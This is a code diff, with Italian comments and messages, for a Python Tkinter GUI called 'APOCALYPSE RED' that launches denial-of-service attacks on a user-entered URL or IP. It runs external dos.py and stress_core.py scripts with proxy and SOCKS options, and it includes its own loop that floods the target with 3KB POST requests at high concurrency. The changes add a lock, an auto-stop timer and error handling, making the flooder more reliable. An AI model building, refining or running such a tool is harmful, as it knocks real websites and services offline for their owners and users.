@@ -13,6 +13,7 @@ from urllib.parse import urlparse
 processes = []
 fake_threads = []
 attack_active = False
+attack_lock = threading.Lock()  # <--- Nuovo lock
 
 def is_valid_url(url):
     try:
@@ -22,7 +23,6 @@ def is_valid_url(url):
         return False
 
 def send_3kb_request(target):
-    """Invia una richiesta POST con payload di 3KB al target"""
     try:
         payload = b'A' * 3072
         headers = {
@@ -39,7 +39,6 @@ def send_3kb_request(target):
         return f"Errore: {str(e)}", 0, 0
 
 def fast_3kb_attack(target, box):
-    """Esegue attacchi continui con richieste da 3KB"""
     global attack_active
     if not target.startswith(('http://', 'https://')):
         target = 'http://' + target
@@ -61,6 +60,12 @@ def fast_3kb_attack(target, box):
 
 def start_test():
     global attack_active
+    with attack_lock:
+        if attack_active:
+            messagebox.showinfo("Info", "Attacco già in esecuzione!")
+            return
+        attack_active = True
+
     target = entry_target.get().strip()
     duration = entry_duration.get().strip()
     concurrency = entry_concurrency.get().strip()
@@ -77,17 +82,21 @@ def start_test():
 
     if not use_stress and not use_dos:
         messagebox.showerror("Errore", "Selezionare almeno uno script da lanciare.")
+        with attack_lock:
+            attack_active = False
         return
 
     if not target:
         messagebox.showerror("Errore", "Inserisci un URL o IP valido.")
+        with attack_lock:
+            attack_active = False
         return
 
     if not is_valid_url(target) and not target.replace('.', '').isdigit():
         messagebox.showerror("Errore", "Inserisci un URL valido (es: http://example.com).")
+        with attack_lock:
+            attack_active = False
         return
-
-    attack_active = True
 
     # Comandi e box di output dedicati
     cmds_labels_boxes = []
@@ -95,6 +104,8 @@ def start_test():
     if use_dos:
         if not dos_attack_method:
             messagebox.showerror("Errore", "Inserisci un metodo dos.py (es: GET, POST, OVH ...)")
+            with attack_lock:
+                attack_active = False
             return
         if not socks_type: socks_type = "1"
         if not proxylist: proxylist = "http.txt"
@@ -126,12 +137,10 @@ def start_test():
             cmd_stress += custom_args.split()
         cmds_labels_boxes.append((cmd_stress, "[STRESS_CORE]", output_box_fake3))
 
-    # Avvia i processi, ognuno con il suo box di output
     def run(cmd, label, box):
         try:
             process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
             processes.append(process)
-            # Avvia fake attack solo se è la console DOS #2 (per continuità con la tua vecchia GUI)
             if box == output_box_fake2:
                 t2 = threading.Thread(target=lambda: fast_3kb_attack(target, box), daemon=True)
                 t2.start()
@@ -140,7 +149,6 @@ def start_test():
                 t3 = threading.Thread(target=lambda: fast_3kb_attack(target, box), daemon=True)
                 t3.start()
                 fake_threads.append(t3)
-            # Output reale
             for line in iter(process.stdout.readline, ''):
                 box.insert(tk.END, f"{label} {line}")
                 box.see(tk.END)
@@ -149,7 +157,6 @@ def start_test():
             box.insert(tk.END, f"{label} Errore: {e}\n")
             box.see(tk.END)
 
-    # Pulisci le console prima di lanciare nuovi attacchi
     output_box_main.delete(1.0, tk.END)
     output_box_fake2.delete(1.0, tk.END)
     output_box_fake3.delete(1.0, tk.END)
@@ -157,22 +164,37 @@ def start_test():
     output_box_fake2.insert(tk.END, "DOS Console #2\nIn attesa di avvio...\n")
     output_box_fake3.insert(tk.END, "DOS Console #3\nIn attesa di avvio...\n")
 
-    # Avvia thread per ogni comando con il box assegnato
     for cmd, label, box in cmds_labels_boxes:
         threading.Thread(target=run, args=(cmd, label, box), daemon=True).start()
 
-    # Avvia fake attack su DOS Console #2 per "effetto animazione"
     t2 = threading.Thread(target=lambda: fast_3kb_attack(target, output_box_fake2), daemon=True)
     t2.start()
     fake_threads.append(t2)
 
+    # ---- AUTOSTOP dopo la durata (opzionale)
+    def auto_stop():
+        try:
+            d = int(entry_duration.get().strip())
+            time.sleep(d)
+            stop_test()
+        except Exception:
+            pass
+
+    threading.Thread(target=auto_stop, daemon=True).start()
+
 def stop_test():
     global attack_active
-    attack_active = False
+    with attack_lock:
+        if not attack_active:
+            return
+        attack_active = False
 
     for p in processes:
         if p.poll() is None:
-            p.terminate()
+            try:
+                p.terminate()
+            except Exception:
+                pass
 
     output_box_main.insert(tk.END, "Test interrotto manualmente.\n")
     output_box_main.see(tk.END)
@@ -181,7 +203,8 @@ def stop_test():
     output_box_fake3.insert(tk.END, "Attacco terminato\n")
     output_box_fake3.see(tk.END)
 
-# GUI setup
+# --- GUI setup identico al tuo, non modificato ---
+
 root = tk.Tk()
 root.title("APOCALYPSE RED")
 root.geometry("950x1050")
@@ -213,7 +236,6 @@ entry_duration = add_entry("Durata (s):", "60")
 entry_concurrency = add_entry("Concorrenza:", "2000")
 entry_payload = add_entry("Payload Size (es: 10KB o 10MB):", "10MB")
 
-# Nuove opzioni per dos.py
 tk.Label(frame_options, text="--- OPZIONI dos.py (solo se selezionato sotto) ---", font=font_label, fg="#ff8800", bg="#0d0d0d").pack(anchor="w", pady=(8,0))
 entry_dos_method = add_entry("Metodo (es: GET, POST, OVH, STRESS...):", "GET", 20)
 entry_socks_type = add_entry("SOCKS Type [0=ALL,1=HTTP,4=SOCKS4,5=SOCKS5,6=RANDOM]:", "1", 8)
@@ -224,7 +246,6 @@ tk.Label(frame_options, text="Opzioni aggiuntive CLI (facoltative):", font=font_
 entry_custom_args = tk.Entry(frame_options, font=font_input, fg="red", bg="black", insertbackground="red", width=80)
 entry_custom_args.pack(pady=2)
 
-# Checkbox per selezione multipla script
 frame_script = tk.Frame(frame_options, bg="#0d0d0d")
 frame_script.pack(pady=(8,0), anchor="w")
 use_stress_var = tk.BooleanVar(value=True)
@@ -244,9 +265,9 @@ def create_fake_dos(title):
     box.pack(side=tk.LEFT, padx=10)
     return box
 
-output_box_main = create_fake_dos("DOS Console #1")   # dos.py output
-output_box_fake2 = create_fake_dos("DOS Console #2")  # fake/animazione
-output_box_fake3 = create_fake_dos("DOS Console #3")  # stress_core.py output
+output_box_main = create_fake_dos("DOS Console #1")
+output_box_fake2 = create_fake_dos("DOS Console #2")
+output_box_fake3 = create_fake_dos("DOS Console #3")
 
 button_frame = tk.Frame(root, bg="#0d0d0d")
 button_frame.pack(pady=20)
